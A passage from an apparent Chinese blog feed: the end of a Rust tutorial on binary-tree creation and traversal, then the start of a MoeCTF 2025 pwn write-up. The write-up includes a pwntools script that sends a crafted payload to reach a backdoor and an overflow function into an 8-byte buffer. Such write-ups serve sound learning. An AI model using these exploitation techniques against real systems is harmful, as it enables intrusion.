<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>把data字段设计为可以为空了，实际上是不必要的，init函数也完全可以把data作为参数……不管了就这么设计了</p>
<p>传递data参数很有说法，最初想的是每次递归舍弃第一位，只传递剩余的切片，但是涉及右子树行不通，于是把data改为可变的，然后每次create都删去一位，类似于全局变量效果</p>
<p>运行测试看到输出：<br><pre class="line-numbers language-text" data-language="text"><code class="language-text">running 1 test
insert: A
insert: B
insert: C
return
return
insert: D
insert: E
return
insert: G
return
return
insert: F
return
return
return
test tests::test_create ... ok<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>
<p>第二轮，递归完成遍历<br><pre class="line-numbers language-rust" data-language="rust"><code class="language-rust"><span class="token keyword">fn</span> <span class="token function-definition function">pre_order_traverse</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token keyword">self</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">if</span> <span class="token keyword">self</span><span class="token punctuation">.</span>data <span class="token operator">==</span> <span class="token class-name">None</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token macro property">println!</span><span class="token punctuation">(</span><span class="token string">"&#123;&#125;"</span><span class="token punctuation">,</span><span class="token keyword">self</span><span class="token punctuation">.</span>data<span class="token punctuation">.</span><span class="token function">unwrap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token keyword">let</span> <span class="token class-name">Some</span><span class="token punctuation">(</span>l<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token operator">&amp;</span><span class="token keyword">self</span><span class="token punctuation">.</span>left <span class="token punctuation">&#123;</span>
        l<span class="token punctuation">.</span><span class="token function">pre_order_traverse</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">if</span> <span class="token keyword">let</span> <span class="token class-name">Some</span><span class="token punctuation">(</span>r<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token operator">&amp;</span><span class="token keyword">self</span><span class="token punctuation">.</span>right <span class="token punctuation">&#123;</span>
        r<span class="token punctuation">.</span><span class="token function">pre_order_traverse</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">fn</span> <span class="token function-definition function">post_order_traverse</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token keyword">self</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">if</span> <span class="token keyword">self</span><span class="token punctuation">.</span>data <span class="token operator">==</span> <span class="token class-name">None</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">if</span> <span class="token keyword">let</span> <span class="token class-name">Some</span><span class="token punctuation">(</span>l<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token operator">&amp;</span><span class="token keyword">self</span><span class="token punctuation">.</span>left <span class="token punctuation">&#123;</span>
        l<span class="token punctuation">.</span><span class="token function">post_order_traverse</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>


    <span class="token keyword">if</span> <span class="token keyword">let</span> <span class="token class-name">Some</span><span class="token punctuation">(</span>r<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token operator">&amp;</span><span class="token keyword">self</span><span class="token punctuation">.</span>right <span class="token punctuation">&#123;</span>
        r<span class="token punctuation">.</span><span class="token function">post_order_traverse</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token macro property">println!</span><span class="token punctuation">(</span><span class="token string">"&#123;&#125;"</span><span class="token punctuation">,</span><span class="token keyword">self</span><span class="token punctuation">.</span>data<span class="token punctuation">.</span><span class="token function">unwrap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">fn</span> <span class="token function-definition function">in_order_traverse</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token keyword">self</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">if</span> <span class="token keyword">self</span><span class="token punctuation">.</span>data <span class="token operator">==</span> <span class="token class-name">None</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">if</span> <span class="token keyword">let</span> <span class="token class-name">Some</span><span class="token punctuation">(</span>l<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token operator">&amp;</span><span class="token keyword">self</span><span class="token punctuation">.</span>left <span class="token punctuation">&#123;</span>
        l<span class="token punctuation">.</span><span class="token function">in_order_traverse</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token macro property">println!</span><span class="token punctuation">(</span><span class="token string">"&#123;&#125;"</span><span class="token punctuation">,</span><span class="token keyword">self</span><span class="token punctuation">.</span>data<span class="token punctuation">.</span><span class="token function">unwrap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">if</span> <span class="token keyword">let</span> <span class="token class-name">Some</span><span class="token punctuation">(</span>r<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token operator">&amp;</span><span class="token keyword">self</span><span class="token punctuation">.</span>right <span class="token punctuation">&#123;</span>
        r<span class="token punctuation">.</span><span class="token function">in_order_traverse</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

……
<span class="token attribute attr-name">#[test]</span>
<span class="token keyword">fn</span> <span class="token function-definition function">test_trans</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">let</span> <span class="token keyword">mut</span> t <span class="token operator">=</span> <span class="token class-name">BinaryTree</span><span class="token punctuation">::</span><span class="token function">init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">let</span> <span class="token keyword">mut</span> s <span class="token operator">=</span> <span class="token string">"ABC  DE G  F   "</span><span class="token punctuation">;</span>
    t<span class="token punctuation">.</span><span class="token function">create</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token keyword">mut</span> s<span class="token punctuation">)</span><span class="token punctuation">;</span>
    t<span class="token punctuation">.</span><span class="token function">in_order_traverse</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    t<span class="token punctuation">.</span><span class="token function">post_order_traverse</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    t<span class="token punctuation">.</span><span class="token function">pre_order_traverse</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>很常规的递归写法，由于self不需要可变，一切都很顺利，测试结果也符合预期</p>
<h2 id="打印二叉树结构"><a href="#打印二叉树结构" class="headerlink" title="打印二叉树结构"></a>打印二叉树结构</h2><pre class="line-numbers language-text" data-language="text"><code class="language-text">按凹入表形式横向打印二叉树结构，即二叉树的根在屏幕的最左边，二叉树的左子树在屏幕的下边，二叉树的右子树在屏幕的上边。

[实现提示]
利用 RDL 遍历方法;(中序遍历右子树、根节点、中序遍历左子树 RDL)利用结点的深度控制横向位置。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<p>要解决的问题是确定凹入表中每个节点的横纵坐标，根据提示，横向坐标用特定的遍历方式（右、中、左），每次打印一行确定，纵向坐标依据节点深度确定，那思路就很清晰了：</p>
<pre class="line-numbers language-rust" data-language="rust"><code class="language-rust">    <span class="token keyword">fn</span> <span class="token function-definition function">print</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token keyword">self</span><span class="token punctuation">,</span> depth <span class="token punctuation">:</span> <span class="token keyword">usize</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span> <span class="token keyword">self</span><span class="token punctuation">.</span>data <span class="token operator">==</span> <span class="token class-name">None</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">return</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>

        <span class="token keyword">if</span> <span class="token keyword">let</span> <span class="token class-name">Some</span><span class="token punctuation">(</span>r<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token operator">&amp;</span><span class="token keyword">self</span><span class="token punctuation">.</span>right <span class="token punctuation">&#123;</span>
            r<span class="token punctuation">.</span><span class="token function">print</span><span class="token punctuation">(</span>depth <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>

        <span class="token keyword">let</span> spaces <span class="token operator">=</span> <span class="token string">" "</span><span class="token punctuation">.</span><span class="token function">repeat</span><span class="token punctuation">(</span>depth <span class="token operator">*</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token macro property">println!</span><span class="token punctuation">(</span><span class="token string">"&#123;&#125;&#123;&#125;"</span><span class="token punctuation">,</span> spaces<span class="token punctuation">,</span> <span class="token keyword">self</span><span class="token punctuation">.</span>data<span class="token punctuation">.</span><span class="token function">unwrap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token keyword">if</span> <span class="token keyword">let</span> <span class="token class-name">Some</span><span class="token punctuation">(</span>l<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token operator">&amp;</span><span class="token keyword">self</span><span class="token punctuation">.</span>left <span class="token punctuation">&#123;</span>
            l<span class="token punctuation">.</span><span class="token function">print</span><span class="token punctuation">(</span>depth <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>

<span class="token comment">//测试</span>

    <span class="token attribute attr-name">#[test]</span>
    <span class="token keyword">fn</span> <span class="token function-definition function">test_print</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">let</span> <span class="token keyword">mut</span> t <span class="token operator">=</span> <span class="token class-name">BinaryTree</span><span class="token punctuation">::</span><span class="token function">init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">let</span> <span class="token keyword">mut</span> s <span class="token operator">=</span> <span class="token string">"ABD  E  CF  G  "</span><span class="token punctuation">;</span>
        t<span class="token punctuation">.</span><span class="token function">create</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token keyword">mut</span> s<span class="token punctuation">)</span><span class="token punctuation">;</span>

        t<span class="token punctuation">.</span><span class="token function">print</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>结果:<br><pre class="line-numbers language-text" data-language="text"><code class="language-text">running 1 test
    G
  C
    F
A
    E
  B
    D
test tests::test_print ... ok<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>
<h2 id="采用非递归算法实现二叉树的遍历"><a href="#采用非递归算法实现二叉树的遍历" class="headerlink" title="采用非递归算法实现二叉树的遍历"></a>采用非递归算法实现二叉树的遍历</h2><p>非递归，需要借助一点技巧，也就是栈。正常递归时会将下一个要执行的指令地址入栈，由于前序遍历先访问当前节点，所以可以模拟这个过程</p>
<pre class="line-numbers language-rust" data-language="rust"><code class="language-rust"><span class="token keyword">fn</span> <span class="token function-definition function">pre_order</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token keyword">self</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">let</span> <span class="token keyword">mut</span> stack <span class="token punctuation">:</span> <span class="token class-name">Vec</span><span class="token operator">&lt;</span><span class="token operator">&amp;</span><span class="token class-name">BinaryTree</span><span class="token operator">></span> <span class="token operator">=</span> <span class="token class-name">Vec</span><span class="token punctuation">::</span><span class="token function">new</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">if</span> <span class="token keyword">self</span><span class="token punctuation">.</span>data <span class="token operator">==</span> <span class="token class-name">None</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    stack<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token keyword">self</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">while</span> <span class="token keyword">let</span> <span class="token class-name">Some</span><span class="token punctuation">(</span>node<span class="token punctuation">)</span> <span class="token operator">=</span> stack<span class="token punctuation">.</span><span class="token function">pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span> <span class="token keyword">let</span> <span class="token class-name">Some</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span> <span class="token operator">=</span> node<span class="token punctuation">.</span>data <span class="token punctuation">&#123;</span>
            <span class="token macro property">println!</span><span class="token punctuation">(</span><span class="token string">"&#123;&#125;"</span><span class="token punctuation">,</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">if</span> <span class="token keyword">let</span> <span class="token class-name">Some</span><span class="token punctuation">(</span>right<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token operator">&amp;</span>node<span class="token punctuation">.</span>right <span class="token punctuation">&#123;</span>
                stack<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>right<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>

            <span class="token keyword">if</span> <span class="token keyword">let</span> <span class="token class-name">Some</span><span class="token punctuation">(</span>left<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token operator">&amp;</span>node<span class="token punctuation">.</span>left <span class="token punctuation">&#123;</span>
                stack<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>left<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>先把下一个要访问的节点入栈（右子树），再访问当前节点及（左子树）</p>
<p>后序遍历先访问的节点后输出，所以可以再用一个栈来模拟<br><pre class="line-numbers language-rust" data-language="rust"><code class="language-rust"><span class="token keyword">fn</span> <span class="token function-definition function">post_order</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token keyword">self</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">let</span> <span class="token keyword">mut</span> stack1 <span class="token operator">=</span> <span class="token class-name">Vec</span><span class="token punctuation">::</span><span class="token function">new</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">let</span> <span class="token keyword">mut</span> stack2 <span class="token operator">=</span> <span class="token class-name">Vec</span><span class="token punctuation">::</span><span class="token function">new</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    stack1<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token keyword">self</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">while</span> <span class="token keyword">let</span> <span class="token class-name">Some</span><span class="token punctuation">(</span>node<span class="token punctuation">)</span> <span class="token operator">=</span> stack1<span class="token punctuation">.</span><span class="token function">pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        stack2<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>node<span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token keyword">if</span> <span class="token keyword">let</span> <span class="token class-name">Some</span><span class="token punctuation">(</span>left<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token operator">&amp;</span>node<span class="token punctuation">.</span>left <span class="token punctuation">&#123;</span>
            stack1<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>left<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
 
        <span class="token keyword">if</span> <span class="token keyword">let</span> <span class="token class-name">Some</span><span class="token punctuation">(</span>right<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token operator">&amp;</span>node<span class="token punctuation">.</span>right <span class="token punctuation">&#123;</span>
            stack1<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>right<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token comment">// stack2中的顺序就是后序遍历的逆序</span>
    <span class="token keyword">while</span> <span class="token keyword">let</span> <span class="token class-name">Some</span><span class="token punctuation">(</span>node<span class="token punctuation">)</span> <span class="token operator">=</span> stack2<span class="token punctuation">.</span><span class="token function">pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span> <span class="token keyword">let</span> <span class="token class-name">Some</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span> <span class="token operator">=</span> node<span class="token punctuation">.</span>data <span class="token punctuation">&#123;</span>
            <span class="token macro property">println!</span><span class="token punctuation">(</span><span class="token string">"&#123;&#125;"</span><span class="token punctuation">,</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>
<p>优先输出的是左下方的，所以先访问右子树，左子树先入栈</p>
<p>中序遍历，左中右。沿着左子树走到叶节点，将过程中访问的节点入栈，然后访问该叶节点，往上追溯访问上一个节点，访问其右子树，如果遇到None则重新从栈pop<br><pre class="line-numbers language-rust" data-language="rust"><code class="language-rust"><span class="token keyword">fn</span> <span class="token function-definition function">in_order</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token keyword">self</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">let</span> <span class="token keyword">mut</span> stack <span class="token operator">=</span> <span class="token class-name">Vec</span><span class="token punctuation">::</span><span class="token function">new</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">let</span> <span class="token keyword">mut</span> current <span class="token operator">=</span> <span class="token class-name">Some</span><span class="token punctuation">(</span><span class="token keyword">self</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">while</span> current<span class="token punctuation">.</span><span class="token function">is_some</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token operator">!</span>stack<span class="token punctuation">.</span><span class="token function">is_empty</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">while</span> <span class="token keyword">let</span> <span class="token class-name">Some</span><span class="token punctuation">(</span>node<span class="token punctuation">)</span> <span class="token operator">=</span> current <span class="token punctuation">&#123;</span>
            stack<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>node<span class="token punctuation">)</span><span class="token punctuation">;</span>
            current <span class="token operator">=</span> node<span class="token punctuation">.</span>left<span class="token punctuation">.</span><span class="token function">as_ref</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">map</span><span class="token punctuation">(</span><span class="token closure-params"><span class="token closure-punctuation punctuation">|</span>n<span class="token closure-punctuation punctuation">|</span></span> <span class="token operator">&amp;</span><span class="token operator">*</span><span class="token operator">*</span>n<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>

        <span class="token keyword">if</span> <span class="token keyword">let</span> <span class="token class-name">Some</span><span class="token punctuation">(</span>node<span class="token punctuation">)</span> <span class="token operator">=</span> stack<span class="token punctuation">.</span><span class="token function">pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">if</span> <span class="token keyword">let</span> <span class="token class-name">Some</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span> <span class="token operator">=</span> node<span class="token punctuation">.</span>data <span class="token punctuation">&#123;</span>
                <span class="token macro property">println!</span><span class="token punctuation">(</span><span class="token string">"&#123;&#125;"</span><span class="token punctuation">,</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>
            current <span class="token operator">=</span> node<span class="token punctuation">.</span>right<span class="token punctuation">.</span><span class="token function">as_ref</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">map</span><span class="token punctuation">(</span><span class="token closure-params"><span class="token closure-punctuation punctuation">|</span>n<span class="token closure-punctuation punctuation">|</span></span> <span class="token operator">&amp;</span><span class="token operator">*</span><span class="token operator">*</span>n<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>测试：<br><pre class="line-numbers language-text" data-language="text"><code class="language-text">#[test]
fn test_pre_order()&#123;
    let mut t = BinaryTree::init();
    let mut s = "ABC  DE G  F   ";
    t.create(&amp;mut s);
    //t.pre_order();
    //t.post_order();
    t.in_order();
&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>
]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;h2 id=&quot;二叉树的建立与遍历&quot;&gt;&lt;a href=&quot;#二叉树的建立与遍历&quot; class=&quot;headerlink&quot; title=&quot;二叉树的建立与遍历&quot;&gt;&lt;/a&gt;二叉树的建立与遍历&lt;/h2&gt;&lt;pre class=&quot;line-numbers language-text&quot;</summary>
        
      
    
    
    
    <category term="从0开始的rust之旅" scheme="https://aucept.in/categories/%E4%BB%8E0%E5%BC%80%E5%A7%8B%E7%9A%84rust%E4%B9%8B%E6%97%85/"/>
    
    
    <category term="rust" scheme="https://aucept.in/tags/rust/"/>
    
  </entry>
  
  <entry>
    <title>Moectf 2025</title>
    <link href="https://aucept.in/2025/10/26/moectf-2025/"/>
    <id>https://aucept.in/2025/10/26/moectf-2025/</id>
    <published>2025-10-26T06:38:17.000Z</published>
    <updated>2025-11-16T13:57:47.374Z</updated>
    
    <content type="html"><![CDATA[<p>一份<del>迟到的</del>不必要的WP，同时也是回顾si进pwn的世界的第一个月</p>
<h3 id="0-二进制漏洞审计入门指北"><a href="#0-二进制漏洞审计入门指北" class="headerlink" title="0 二进制漏洞审计入门指北"></a>0 二进制漏洞审计入门指北</h3><p>真正的梦开始的地方，从熟悉流程开始，题目里把解题脚本直接给了出来：<br><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>                                    <span class="token comment"># 导入 pwntools。</span>
context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span> <span class="token comment"># 一些基本的配置。</span>

<span class="token comment"># 有时我们需要在本地调试运行程序，需要配置 context.terminal。详见入门指北。</span>

<span class="token comment"># io = process('./pwn')             # 在本地运行程序。</span>
<span class="token comment"># gdb.attach(io)                    # 启动 GDB</span>
io <span class="token operator">=</span> connect<span class="token punctuation">(</span>???<span class="token punctuation">,</span> ???<span class="token punctuation">)</span>              <span class="token comment"># 与在线环境交互。</span>
io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">b'114511'</span><span class="token punctuation">)</span>              <span class="token comment"># 什么时候用 send 什么时候用 sendline？</span>

payload  <span class="token operator">=</span> p32<span class="token punctuation">(</span><span class="token number">0xdeadbeef</span><span class="token punctuation">)</span>          <span class="token comment"># p32(0xdeadbeef)、b"\xde\xad\xbe\xef"、b"deadbeef" 有什么区别？</span>
                                    <span class="token comment"># 你看懂原程序这里的检查逻辑了吗？</span>
payload <span class="token operator">+=</span> <span class="token string">b'shuijiangui'</span>           <span class="token comment"># strcmp</span>

io<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">b'password.'</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span> <span class="token comment"># 发送！通过所有的检查。</span>

io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>                    <span class="token comment"># 手动接收 flag。</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>
<p>正常的程序运行流程就会进入后门，需要输入一次数字和一次字符串，都通过比较即可进入后门，读出flag，这不是重点</p>
<p>pwntools提供了<code>process</code> <code>connect</code>等等函数以自动化与程序交互。仍记得第一次看到以上脚本时的茫然。</p>
<h3 id="1-ez-u64"><a href="#1-ez-u64" class="headerlink" title="1 ez_u64"></a>1 ez_u64</h3><p>这道题需要认识到数字的实际存储与看到的并不等同。</p>
<p>程序以字节形式输出了一个数字，它看起来大概是这样的：�␦�`’Ce@，8个莫名奇妙的字符</p>
<p>借助pwntools的u64可以将其还原回数字。同时这个数字每次运行不同，需要我去手动接收输出的字符</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#……</span>
hint_data <span class="token operator">=</span> io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span>

num <span class="token operator">=</span> u64<span class="token punctuation">(</span>hint_data<span class="token punctuation">)</span>
<span class="token comment">#……</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="1-find-it"><a href="#1-find-it" class="headerlink" title="1 find it"></a>1 find it</h3><p>涉及文件描述符的分配策略，即需要时返回当前可用的最小的文件描述符</p>
<p>read和write函数的三个参数均为：文件描述符、缓冲区、缓冲区大小</p>
<p>本题中先是<code>v3 = dup(1);</code>复制了标准输出的stdout，这里给v3的文件描述符的就是3，然后close(1)把标准输出关闭，再执行了一个open输入文件，并让我们猜出其文件描述符，即重新变得可用的1</p>
<h3 id="2-EZtext"><a href="#2-EZtext" class="headerlink" title="2 EZtext"></a>2 EZtext</h3><p>如果说前几道题只是学习pwn之前要掌握的基本知识，这里终于算迈进了pwn的大门</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> __fastcall <span class="token function">overflow</span><span class="token punctuation">(</span><span class="token keyword">int</span> a1<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
  _BYTE buf<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+18h] [rbp-8h] BYREF</span>

  <span class="token keyword">if</span> <span class="token punctuation">(</span> a1 <span class="token operator">&lt;=</span> <span class="token number">7</span> <span class="token punctuation">)</span>
    <span class="token keyword">return</span> <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Come on, you can't even fill up this array?"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
